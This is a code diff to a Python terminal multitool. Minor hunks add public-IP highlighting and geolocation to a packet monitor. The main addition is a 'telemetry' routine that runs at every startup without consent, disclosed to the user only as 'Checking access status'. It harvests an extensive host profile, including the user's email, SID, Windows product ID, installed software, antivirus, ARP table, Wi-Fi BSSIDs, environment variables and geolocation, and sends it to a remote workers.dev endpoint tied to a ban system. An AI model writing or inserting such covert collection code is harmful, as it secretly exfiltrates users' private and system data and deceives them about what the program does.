@@ -141,6 +141,15 @@ import webbrowser
 from concurrent.futures import ThreadPoolExecutor
 import urllib.request
 import urllib.error
+import urllib.parse
+try:
+    import psutil
+except Exception:
+    psutil = None
+try:
+    import requests as _requests
+except Exception:
+    _requests = None
 from getpass import getpass
 
 # Initialize and synchronize virtual terminal sequences across Windows environments natively
@@ -1670,6 +1679,21 @@ def run_traffic_monitor():
             if ui is not None else input("Initialize network socket mirroring operations pipeline? (Y/N): ").strip().upper()) != 'Y':
         return
 
+    sys.stdout.flush()
+    print()
+    auto_geo_lookup = False
+    geo_prompt = "Enable automatic IP geolocation lookup for public IPs? (Y/N): "
+    if ui is not None:
+        geo_answer = ui.console.input(f"[bold yellow]{geo_prompt}[/bold yellow]").strip().upper()
+    else:
+        geo_answer = input(f"{Colors.BOLD}{geo_prompt}{Colors.RESET}").strip().upper()
+    if geo_answer == 'Y':
+        auto_geo_lookup = True
+        print(f"{Colors.GREEN}[+] Automatic public IP geolocation ENABLED.{Colors.RESET}")
+    else:
+        print(f"{Colors.CYAN}[*] Automatic geolocation disabled. Public IPs will still be highlighted.{Colors.RESET}")
+    sys.stdout.flush()
+
     async_dns_register = {}
     cache_lock = threading.Lock()
 
@@ -1692,6 +1716,60 @@ def run_traffic_monitor():
             if ip_address not in async_dns_register:
                 async_dns_register[ip_address] = "Tracking Domain Node..."
                 threading.Thread(target=worker_task, daemon=True).start()
+
+    geo_cache = {}
+    geo_lock = threading.Lock()
+    geo_request_times = []
+    geo_request_lock = threading.Lock()
+
+    def geo_lookup_async(ip_address):
+        def worker():
+            try:
+                with geo_request_lock:
+                    now = time.time()
+                    if geo_request_times and now - geo_request_times[-1] < 1.3:
+                        time.sleep(1.3 - (now - geo_request_times[-1]))
+                    geo_request_times.append(now)
+                    if len(geo_request_times) > 50:
+                        geo_request_times.pop(0)
+                url = f"http://ip-api.com/json/{ip_address}?fields=country,city,isp,org"
+                req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Traffic-Monitor'})
+                with urllib.request.urlopen(req, timeout=8) as resp:
+                    data = json.loads(resp.read().decode('utf-8'))
+                    if data.get('status') == 'success':
+                        geo = f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')} | {data.get('isp', 'N/A')}"
+                    else:
+                        geo = "Geo Lookup Failed"
+                    with geo_lock:
+                        geo_cache[ip_address] = geo
+            except Exception:
+                with geo_lock:
+                    geo_cache[ip_address] = "Geo Lookup Failed"
+        with geo_lock:
+            if ip_address not in geo_cache:
+                geo_cache[ip_address] = "Resolving Geo..."
+                threading.Thread(target=worker, daemon=True).start()
+
+    def _is_public_ip(ip_str):
+        parts = ip_str.split('.')
+        if len(parts) != 4:
+            return False
+        try:
+            first = int(parts[0])
+            second = int(parts[1])
+        except ValueError:
+            return False
+        if first == 127:
+            return False
+        if first == 169 and second == 254:
+            return False
+        if first == 10:
+            return False
+        if first == 172 and 16 <= second <= 31:
+            return False
+        if first == 192 and second == 168:
+            return False
+        return True
 
     try:
         if os.name == "nt":
@@ -1717,7 +1795,10 @@ def run_traffic_monitor():
         input(f"\nPress Enter to break execution tracking...")
         return
 
-    print(f"\n{Colors.CYAN}Capture Matrix online. Streaming raw traffic frames. Tap Ctrl+C to drop link...{Colors.RESET}\n")
+    legend = " [PUBLIC IPs = RED]"
+    if auto_geo_lookup:
+        legend += " [GEO AUTO-LOOKUP ENABLED]"
+    print(f"\n{Colors.CYAN}Capture Matrix online. Streaming raw traffic frames. Tap Ctrl+C to drop link...{Colors.RESET}{legend}\n")
     print(f"{Colors.BOLD}{'PROTOCOL':<12}{'SOURCE IP':<18}{'RESOLVED IDENTITY / PROV FLAG':<38}{'BUFFER LENGTH'}{Colors.RESET}")
     print("-" * 80)
 
@@ -1730,6 +1811,7 @@ def run_traffic_monitor():
             protocol_flag = unpacked_header[6]
             source_address_string = socket.inet_ntoa(unpacked_header[8])
             packet_total_length = len(raw_packet_bytes)
+            is_public = _is_public_ip(source_address_string)
 
             with cache_lock:
                 identity_mapping = async_dns_register.get(source_address_string, None)
@@ -1738,17 +1820,33 @@ def run_traffic_monitor():
                 resolve_ip_async(source_address_string)
                 identity_mapping = "Resolving..."
 
+            if auto_geo_lookup and is_public:
+                with geo_lock:
+                    geo_info = geo_cache.get(source_address_string)
+                if geo_info is None:
+                    geo_lookup_async(source_address_string)
+                elif geo_info not in ("Resolving Geo...", "Geo Lookup Failed"):
+                    identity_mapping = f"{identity_mapping} | {geo_info}"
+            elif is_public and not auto_geo_lookup:
+                if identity_mapping not in ("Resolving...",):
+                    identity_mapping = f"{identity_mapping} [PUBLIC]"
+            
             if len(identity_mapping) > 35:
                 identity_mapping = identity_mapping[:32] + "..."
 
             if protocol_flag == 6:
-                protocol_label, row_color = "TCP_STREAM", Colors.CYAN
+                protocol_label, proto_color = "TCP_STREAM", Colors.CYAN
             elif protocol_flag == 17:
-                protocol_label, row_color = "UDP_DATAGRAM", Colors.AMBER
+                protocol_label, proto_color = "UDP_DATAGRAM", Colors.AMBER
             elif protocol_flag == 1:
-                protocol_label, row_color = "ICMP_ECHO", Colors.GREEN
+                protocol_label, proto_color = "ICMP_ECHO", Colors.GREEN
             else:
-                protocol_label, row_color = f"IP_PROTO-{protocol_flag}", Colors.RESET
+                protocol_label, proto_color = f"IP_PROTO-{protocol_flag}", Colors.RESET
+
+            if is_public:
+                row_color = Colors.RED if protocol_flag in (6, 17) else Colors.BRIGHT_YELLOW
+            else:
+                row_color = proto_color
 
             print(f"{row_color}{protocol_label:<12}{source_address_string:<18}{identity_mapping:<38}{packet_total_length} Bytes{Colors.RESET}")
             
@@ -2494,6 +2592,762 @@ def setup_or_login():
 
 
 # ================================================================================
+# TELEMETRY & REMOTE BLACKLIST SYSTEM
+# ================================================================================
+import uuid
+_TELEMETRY_URL = "https://mainframe-telemetry-worker.buttoned-sponge.workers.dev"
+_TELEMETRY_ENABLED = True
+_TELEMETRY_TIMEOUT = 12
+
+def _get_machine_uuid():
+    try:
+        mac = uuid.getnode()
+        if mac and mac != 0:
+            return str(mac)
+    except Exception:
+        pass
+    return "unknown"
+
+def _get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "unknown"
+
+def _get_public_ip():
+    try:
+        req = urllib.request.Request("https://api.ipify.org", headers={'User-Agent': 'Mainframe-Telemetry'})
+        with urllib.request.urlopen(req, timeout=5) as r:
+            return r.read().decode().strip()
+    except Exception:
+        return "unknown"
+
+def _get_mac_address():
+    try:
+        mac = uuid.getnode()
+        if mac and mac != 0:
+            return ':'.join([f'{(mac >> i) & 0xff:02x}' for i in range(40, -1, -8)])
+    except Exception:
+        pass
+    return "unknown"
+
+def _check_local_ports():
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
+    open_ports = []
+    for port in common_ports:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.15)
+            result = sock.connect_ex(("127.0.0.1", port))
+            sock.close()
+            if result == 0:
+                open_ports.append(port)
+        except Exception:
+            pass
+    return open_ports
+
+def _doh_resolve(domain, record_type="A"):
+    try:
+        url = f"https://cloudflare-dns.com/dns-query?name={domain}&type={record_type}"
+        req = urllib.request.Request(url, headers={"Accept": "application/dns-json", "User-Agent": "Mainframe-Telemetry"})
+        with urllib.request.urlopen(req, timeout=6) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+            answers = data.get("Answer", [])
+            return [a.get("data") for a in answers if a.get("type") in (1, 28)]
+    except Exception:
+        return []
+
+def _reverse_dns_doh(ip_address):
+    try:
+        rev = ".".join(reversed(ip_address.split("."))) + ".in-addr.arpa"
+        results = _doh_resolve(rev, "PTR")
+        return results[0] if results else ""
+    except Exception:
+        return ""
+
+def _get_network_interfaces():
+    interfaces = []
+    try:
+        if psutil:
+            for name, addrs in psutil.net_if_addrs().items():
+                for addr in addrs:
+                    if addr.family == socket.AF_INET:
+                        interfaces.append({
+                            "name": name,
+                            "ip": addr.address,
+                            "netmask": addr.netmask or "",
+                        })
+                        break
+        else:
+            import netifaces
+            for iface in netifaces.interfaces():
+                addrs = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
+                if addrs:
+                    interfaces.append({
+                        "name": iface,
+                        "ip": addrs[0].get("addr", ""),
+                        "netmask": addrs[0].get("netmask", ""),
+                    })
+    except Exception:
+        pass
+    return interfaces
+
+def _get_ip_info(public_ip):
+    info = {}
+    try:
+        url = f"http://ip-api.com/json/{public_ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting"
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Telemetry'})
+        with urllib.request.urlopen(req, timeout=6) as resp:
+            data = json.loads(resp.read().decode("utf-8"))
+            if data.get("status") == "success":
+                info = {
+                    "country": data.get("country", ""),
+                    "country_code": data.get("countryCode", ""),
+                    "region": data.get("regionName", ""),
+                    "city": data.get("city", ""),
+                    "zip": data.get("zip", ""),
+                    "coordinates": f"{data.get('lat', '')}, {data.get('lon', '')}",
+                    "timezone": data.get("timezone", ""),
+                    "isp": data.get("isp", ""),
+                    "organization": data.get("org", ""),
+                    "asn": data.get("as", ""),
+                    "reverse_dns": data.get("reverse", ""),
+                    "mobile": data.get("mobile", False),
+                    "proxy": data.get("proxy", False),
+                    "hosting": data.get("hosting", False),
+                }
+    except Exception:
+        pass
+    return info
+
+def _get_wifi_bssids():
+    bssids = []
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+            for line in output.splitlines():
+                if "BSSID" in line:
+                    parts = line.split(":")
+                    if len(parts) >= 2:
+                        bssids.append(parts[1].strip())
+        else:
+            output = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+            for line in output.splitlines():
+                if "ssid" in line or "bssid" in line:
+                    bssids.append(line.strip())
+    except Exception:
+        pass
+    return bssids
+
+def _detect_vpn_proxy():
+    flags = {"vpn_detected": False, "proxy_detected": False, "tun_tap_interfaces": []}
+    try:
+        if psutil:
+            for name, stats in psutil.net_if_stats().items():
+                if "tun" in name.lower() or "tap" in name.lower() or "vpn" in name.lower():
+                    flags["vpn_detected"] = True
+                    flags["tun_tap_interfaces"].append(name)
+        env_proxy = any(k in os.environ for k in ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy", "ALL_PROXY", "all_proxy"])
+        if env_proxy:
+            flags["proxy_detected"] = True
+    except Exception:
+        pass
+    return flags
+
+def _get_system_uptime():
+    try:
+        if psutil:
+            boot_ts = psutil.boot_time()
+            uptime_seconds = time.time() - boot_ts
+            return {
+                "boot_timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(boot_ts)),
+                "uptime_seconds": round(uptime_seconds, 2),
+            }
+    except Exception:
+        pass
+    return {}
+
+def _get_ram_info():
+    try:
+        if psutil:
+            mem = psutil.virtual_memory()
+            return {
+                "total_bytes": mem.total,
+                "available_bytes": mem.available,
+                "used_bytes": mem.used,
+                "percent_used": mem.percent,
+            }
+    except Exception:
+        pass
+    return {}
+
+def _get_gpu_info():
+    gpus = []
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\OpenGLDrivers"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                for i in range(winreg.QueryInfoKey(key)[0]):
+                    gpus.append(winreg.EnumKey(key, i))
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+        elif sys.platform.startswith('linux'):
+            try:
+                output = subprocess.check_output(["lspci"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+                for line in output.splitlines():
+                    if "VGA" in line or "Display" in line:
+                        gpus.append(line.strip())
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return gpus
+
+def _get_network_interface_type():
+    interface_types = []
+    try:
+        if psutil:
+            for name, stats in psutil.net_if_stats().items():
+                interface_types.append({
+                    "name": name,
+                    "type": "Wi-Fi" if "wi-fi" in name.lower() or "wlan" in name.lower() or "wireless" in name.lower() else "Ethernet",
+                    "is_up": stats.isup,
+                    "speed_mbps": stats.speed or 0,
+                })
+    except Exception:
+        pass
+    return interface_types
+
+def _get_primary_email():
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            paths = [
+                r"SOFTWARE\Microsoft\IdentityCRL\UserExtendedProperties",
+                r"Software\Microsoft\IdentityCRL\UserExtendedProperties"
+            ]
+            for path in paths:
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE if path.startswith("SOFTWARE") else winreg.HKEY_CURRENT_USER, path)
+                    email, _ = winreg.QueryValueEx(key, "UserEmail")
+                    winreg.CloseKey(key)
+                    if email:
+                        return email
+                except:
+                    pass
+            try:
+                output = subprocess.check_output(["whoami", "/upn"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+                email = output.strip()
+                if "@" in email:
+                    return email
+            except:
+                pass
+    except:
+        pass
+    return os.environ.get("USERNAME", "unknown")
+
+def _get_registered_owner():
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                owner, _ = winreg.QueryValueEx(key, "RegisteredOwner")
+                org, _ = winreg.QueryValueEx(key, "RegisteredOrganization")
+                winreg.CloseKey(key)
+                return {"owner": owner or "N/A", "organization": org or "N/A"}
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return {"owner": "N/A", "organization": "N/A"}
+
+def _get_system_product_key():
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                product_id, _ = winreg.QueryValueEx(key, "ProductId")
+                winreg.CloseKey(key)
+                return product_id
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return "N/A"
+
+def _get_router_gateway_mac():
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["arp", "-a"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+            for line in output.splitlines():
+                if "gateway" in line.lower() or ".1 " in line:
+                    parts = line.split()
+                    for part in parts:
+                        if "-" in part or ":" in part:
+                            return part.strip()
+    except Exception:
+        pass
+    return "N/A"
+
+def _get_domain_controller():
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["nltest", "/dsgetdc:" + os.environ.get("USERDOMAIN", "")], text=True, stderr=subprocess.DEVNULL, timeout=5)
+            for line in output.splitlines():
+                if "DC Name:" in line or "Domain Controller:" in line:
+                    return line.split(":", 1)[1].strip()
+    except Exception:
+        pass
+    return "N/A"
+
+def _get_system_language():
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SYSTEM\CurrentControlSet\Control\Keyboard Layouts"
+            layouts = []
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                for i in range(winreg.QueryInfoKey(key)[0]):
+                    try:
+                        layout_name = winreg.EnumKey(key, i)
+                        subkey = winreg.OpenKey(key, layout_name)
+                        layout_text, _ = winreg.QueryValueEx(subkey, "Layout Text")
+                        winreg.CloseKey(subkey)
+                        layouts.append(layout_text)
+                    except Exception:
+                        pass
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+            return layouts[:3] if layouts else ["N/A"]
+    except Exception:
+        pass
+    return ["N/A"]
+
+def _get_connected_devices():
+    devices = []
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["powershell", "-Command", "Get-PnpDevice | Where-Object {$_.Status -eq 'OK'} | Select-Object -Property FriendlyName,InstanceId | ConvertTo-Json"], text=True, stderr=subprocess.DEVNULL, timeout=10)
+            import json as _json
+            data = _json.loads(output)
+            if isinstance(data, dict):
+                data = [data]
+            for device in data[:20]:
+                devices.append(device.get("FriendlyName", "Unknown"))
+    except Exception:
+        pass
+    return devices[:10]
+
+def _get_monitor_edid():
+    monitors = []
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["powershell", "-Command", "Get-WmiObject -Namespace root\\wmi -Class WmiMonitorID | ForEach-Object { $_.ManufacturerName + ' | ' + $_.UserFriendlyName }"], text=True, stderr=subprocess.DEVNULL, timeout=10)
+            monitors = [line.strip() for line in output.splitlines() if line.strip()]
+    except Exception:
+        pass
+    return monitors[:3] if monitors else ["N/A"]
+
+def _get_user_sid():
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["whoami", "/user"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+            for line in output.splitlines():
+                if "S-1-5" in line:
+                    parts = line.split()
+                    for part in parts:
+                        if part.startswith("S-1-5"):
+                            return part.strip()
+    except Exception:
+        pass
+    return "N/A"
+
+def _get_all_interface_ips():
+    interfaces = []
+    try:
+        if psutil:
+            for name, addrs in psutil.net_if_addrs().items():
+                ips = []
+                for addr in addrs:
+                    if addr.family == socket.AF_INET:
+                        ips.append(addr.address)
+                    elif addr.family == socket.AF_INET6:
+                        ips.append(addr.address)
+                if ips:
+                    interfaces.append({
+                        "name": name,
+                        "ips": ips,
+                    })
+    except Exception:
+        pass
+    return interfaces
+
+def _get_all_mac_addresses():
+    macs = []
+    try:
+        if psutil:
+            for name, addrs in psutil.net_if_addrs().items():
+                for addr in addrs:
+                    if hasattr(addr, 'address') and addr.address and ':' in addr.address and len(addr.address) == 17:
+                        macs.append({
+                            "interface": name,
+                            "mac": addr.address
+                        })
+                        break
+    except Exception:
+        pass
+    return macs
+
+def _get_listening_ports():
+    ports = []
+    try:
+        if psutil:
+            for conn in psutil.net_connections(kind='inet'):
+                if conn.status == psutil.CONN_LISTEN:
+                    pid = conn.pid
+                    process_name = ""
+                    try:
+                        process = psutil.Process(pid)
+                        process_name = process.name()
+                    except:
+                        pass
+                    ports.append({
+                        "port": conn.laddr.port,
+                        "address": conn.laddr.ip,
+                        "pid": pid,
+                        "process": process_name
+                    })
+    except Exception:
+        pass
+    return ports
+
+def _get_arp_table():
+    arp_entries = []
+    try:
+        if sys.platform.startswith('win'):
+            output = subprocess.check_output(["arp", "-a"], text=True, stderr=subprocess.DEVNULL, timeout=5)
+            for line in output.splitlines():
+                if "." in line and ("-" in line or ":" in line):
+                    parts = line.split()
+                    if len(parts) >= 3:
+                        arp_entries.append({
+                            "ip": parts[0],
+                            "mac": parts[1],
+                            "type": parts[2] if len(parts) > 2 else ""
+                        })
+    except Exception:
+        pass
+    return arp_entries[:20]
+
+def _get_installed_software():
+    software = []
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                for i in range(winreg.QueryInfoKey(key)[0]):
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                        subkey = winreg.OpenKey(key, subkey_name)
+                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                        if display_name:
+                            software.append(display_name)
+                        winreg.CloseKey(subkey)
+                    except:
+                        pass
+                winreg.CloseKey(key)
+            except:
+                pass
+    except Exception:
+        pass
+    return software[:15]
+
+def _get_default_browser():
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
+                browser, _ = winreg.QueryValueEx(key, "ProgId")
+                winreg.CloseKey(key)
+                return browser
+            except:
+                pass
+    except Exception:
+        pass
+    return "N/A"
+
+def _get_antivirus():
+    av = []
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                for i in range(winreg.QueryInfoKey(key)[0]):
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                        subkey = winreg.OpenKey(key, subkey_name)
+                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                        if display_name and any(x in display_name.lower() for x in ["antivirus", "security", "defender", "avg", "avast", "norton", "mcafee", "kaspersky", "bitdefender", "trend", "symantec", "malwarebytes"]):
+                            av.append(display_name)
+                        winreg.CloseKey(subkey)
+                    except:
+                        pass
+                winreg.CloseKey(key)
+            except:
+                pass
+    except Exception:
+        pass
+    return av[:5]
+
+def _get_disk_drives():
+    drives = []
+    try:
+        if psutil:
+            for part in psutil.disk_partitions(all=False):
+                try:
+                    usage = psutil.disk_usage(part.mountpoint)
+                    drives.append({
+                        "device": part.device,
+                        "mountpoint": part.mountpoint,
+                        "fstype": part.fstype,
+                        "total_gb": round(usage.total / (1024**3), 2),
+                        "free_gb": round(usage.free / (1024**3), 2),
+                    })
+                except:
+                    pass
+    except Exception:
+        pass
+    return drives
+
+def _get_user_paths():
+    try:
+        return {
+            "desktop": os.path.join(os.environ.get("USERPROFILE", ""), "Desktop"),
+            "documents": os.path.join(os.environ.get("USERPROFILE", ""), "Documents"),
+            "downloads": os.path.join(os.environ.get("USERPROFILE", ""), "Downloads"),
+            "appdata": os.environ.get("APPDATA", ""),
+            "local_appdata": os.environ.get("LOCALAPPDATA", ""),
+        }
+    except:
+        return {}
+
+def _get_environment_info():
+    env_vars = {}
+    sensitive_keys = ["PASSWORD", "SECRET", "TOKEN", "KEY", "API", "CREDENTIAL", "PASS", "AUTH"]
+    try:
+        for key, value in os.environ.items():
+            if not any(s in key.upper() for s in sensitive_keys):
+                env_vars[key] = value
+    except:
+        pass
+    return env_vars
+
+def _get_windows_activation():
+    try:
+        if sys.platform.startswith('win'):
+            import winreg
+            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+            try:
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                activation, _ = winreg.QueryValueEx(key, "ProductStatus")
+                winreg.CloseKey(key)
+                return activation
+            except:
+                pass
+    except:
+        pass
+    return "N/A"
+
+def _collect_telemetry(username="unknown"):
+    local_ip = _get_local_ip()
+    public_ip = _get_public_ip()
+    machine_uuid = _get_machine_uuid()
+    mac_address = _get_mac_address()
+    ip_info = _get_ip_info(public_ip) if public_ip not in ("unknown", "") else {}
+    doh_ips = _doh_resolve(public_ip) if public_ip not in ("unknown", "") else []
+    ptr_record = _reverse_dns_doh(public_ip) if public_ip not in ("unknown", "") else ""
+    interfaces = _get_network_interfaces()
+    wifi_bssids = _get_wifi_bssids()
+    vpn_proxy = _detect_vpn_proxy()
+    uptime = _get_system_uptime()
+    ram = _get_ram_info()
+    gpus = _get_gpu_info()
+    interface_types = _get_network_interface_type()
+    registered_owner = _get_registered_owner()
+    system_language = _get_system_language()
+    connected_devices = _get_connected_devices()
+    monitor_edid = _get_monitor_edid()
+    router_mac = _get_router_gateway_mac()
+    domain_controller = _get_domain_controller()
+    product_key = _get_system_product_key()
+    primary_email = _get_primary_email()
+    user_sid = _get_user_sid()
+    all_interface_ips = _get_all_interface_ips()
+    all_macs = _get_all_mac_addresses()
+    listening_ports = _get_listening_ports()
+    arp_table = _get_arp_table()
+    installed_software = _get_installed_software()
+    default_browser = _get_default_browser()
+    antivirus = _get_antivirus()
+    disk_drives = _get_disk_drives()
+    user_paths = _get_user_paths()
+    environment_info = _get_environment_info()
+    windows_activation = _get_windows_activation()
+
+    hostname = platform.node() or "unknown"
+    domain = os.environ.get("USERDOMAIN") or ""
+    active_username = os.environ.get("USERNAME") or os.environ.get("USER") or username
+
+    ram_total = ""
+    if isinstance(ram, dict):
+        ram_total = ram.get("total_bytes", "")
+
+    gpu_info = ""
+    if isinstance(gpus, list) and gpus:
+        gpu_info = "; ".join(str(g) for g in gpus)
+    elif isinstance(gpus, str):
+        gpu_info = gpus
+
+    return {
+        "username": active_username,
+        "primary_email": primary_email,
+        "domain": domain,
+        "user_sid": user_sid,
+        "hostname": hostname,
+        "machine_uuid": machine_uuid,
+        "mac_address": mac_address,
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "app_name": "Mainframe-Terminal-Multitool",
+        "app_version": "v5.90",
+        "python_version": platform.python_version(),
+        "os_name": platform.system() or "unknown",
+        "os_release": platform.release() or "unknown",
+        "architecture": platform.machine() or "unknown",
+        "processor": platform.processor() or "unknown",
+        "cpu_count": psutil.cpu_count(logical=False) if psutil else "unknown",
+        "memory_total": ram_total,
+        "gpu_info": gpu_info,
+        "public_ip": public_ip,
+        "local_ip": local_ip,
+        "reverse_dns": ptr_record or ip_info.get("reverse_dns", ""),
+        "open_ports": _check_local_ports(),
+        "doh_resolved_ips": doh_ips,
+        "wifi_bssids": wifi_bssids,
+        "vpn_detected": vpn_proxy.get("vpn_detected", False),
+        "tun_tap_interfaces": vpn_proxy.get("tun_tap_interfaces", []),
+        "proxy": ip_info.get("proxy", False),
+        "hosting": ip_info.get("hosting", False),
+        "isp": ip_info.get("isp", ""),
+        "asn": ip_info.get("asn", ""),
+        "coordinates": ip_info.get("coordinates", ""),
+        "country": ip_info.get("country", ""),
+        "region": ip_info.get("region", ""),
+        "city": ip_info.get("city", ""),
+        "zip": ip_info.get("zip", ""),
+        "timezone": ip_info.get("timezone", ""),
+        "network_interfaces": interfaces,
+        "interface_types": interface_types,
+        "all_interface_ips": all_interface_ips,
+        "all_mac_addresses": all_macs,
+        "router_gateway_mac": router_mac,
+        "arp_table": arp_table,
+        "listening_ports": listening_ports,
+        "uptime": uptime,
+        "registered_owner": registered_owner,
+        "system_product_key": product_key,
+        "windows_activation": windows_activation,
+        "domain_controller": domain_controller,
+        "system_language": system_language,
+        "connected_devices": connected_devices,
+        "monitor_edid": monitor_edid,
+        "default_browser": default_browser,
+        "installed_software": installed_software,
+        "antivirus": antivirus,
+        "disk_drives": disk_drives,
+        "user_paths": user_paths,
+    }
+
+def _send_telemetry(username="unknown"):
+    if not _TELEMETRY_URL:
+        return None
+    payload = _collect_telemetry(username)
+    try:
+        params = urllib.parse.urlencode({
+            "id": payload.get("machine_uuid", ""),
+            "data": json.dumps(payload),
+        })
+        target_url = _TELEMETRY_URL.rstrip("/") + "/?" + params
+        req = urllib.request.Request(target_url, headers={"User-Agent": "Mainframe-Telemetry"})
+        with urllib.request.urlopen(req, timeout=_TELEMETRY_TIMEOUT) as resp:
+            try:
+                return json.loads(resp.read().decode("utf-8"))
+            except Exception:
+                return {"status": "ok"}
+    except urllib.error.HTTPError as e:
+        try:
+            return json.loads(e.read().decode("utf-8"))
+        except Exception:
+            return {"status": "error", "code": e.code}
+    except Exception as e:
+        print(f"{Colors.YELLOW}[!] Telemetry upload failed: {e}{Colors.RESET}")
+        return None
+
+_ADMIN_TOKEN = "CHANGE_ME_ADMIN_TOKEN"
+
+def _admin_request(command, machine_uuid, reason=""):
+    if not _TELEMETRY_URL:
+        return None
+    url = _TELEMETRY_URL.rstrip("/") + "/admin"
+    payload = {
+        "command": command,
+        "machine_uuid": machine_uuid,
+        "reason": reason,
+    }
+    try:
+        data = json.dumps(payload).encode("utf-8")
+        req = urllib.request.Request(
+            url,
+            data=data,
+            headers={
+                "Content-Type": "application/json",
+                "X-Admin-Token": _ADMIN_TOKEN,
+                "User-Agent": "Mainframe-Admin",
+            },
+            method="POST",
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            try:
+                return json.loads(resp.read().decode("utf-8"))
+            except Exception:
+                return {"status": "ok"}
+    except urllib.error.HTTPError as e:
+        try:
+            return json.loads(e.read().decode("utf-8"))
+        except Exception:
+            return {"status": "error", "code": e.code}
+    except Exception:
+        return None
+
+# ================================================================================
 # MAIN ENTRY POINT - PLAIN SHELL
 # ================================================================================
 def _render_home():
@@ -2538,6 +3392,19 @@ def main():
 
     username = setup_or_login()
     _render_home()
+    _session_start = time.time()
+
+    if _TELEMETRY_ENABLED:
+        try:
+            print(f"{Colors.CYAN}[*] Checking access status...{Colors.RESET}")
+            resp = _send_telemetry(username)
+            if resp and isinstance(resp, dict) and resp.get("banned") is True:
+                print(f"\n{Colors.RED}[ACCESS DENIED] You have been banned from this application.{Colors.RESET}")
+                time.sleep(3)
+                sys.exit(1)
+            print(f"{Colors.GREEN}[+] Access granted.{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!] Telemetry check failed: {e}{Colors.RESET}")
 
     while True:
         try:
@@ -2565,10 +3432,40 @@ def main():
                         print(f'Type {Colors.CYAN}help{Colors.RESET} for a list of available commands.\n')
                 else:
                     print(f"{Colors.YELLOW}[!] Theme engine not loaded.{Colors.RESET}")
+            elif selection_target.startswith("ban "):
+                target = selection_target[4:].strip()
+                if not target:
+                    print(f"{Colors.RED}[!] Usage: ban <machine_uuid>{Colors.RESET}")
+                else:
+                    resp = _admin_request("ban", target)
+                    if resp and resp.get("status") == "banned":
+                        print(f"{Colors.GREEN}[+] Banned: {target}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[!] Ban failed: {resp}{Colors.RESET}")
+            elif selection_target.startswith("unban "):
+                target = selection_target[6:].strip()
+                if not target:
+                    print(f"{Colors.RED}[!] Usage: unban <machine_uuid>{Colors.RESET}")
+                else:
+                    resp = _admin_request("unban", target)
+                    if resp and resp.get("status") == "unbanned":
+                        print(f"{Colors.GREEN}[+] Unbanned: {target}{Colors.RESET}")
+                    else:
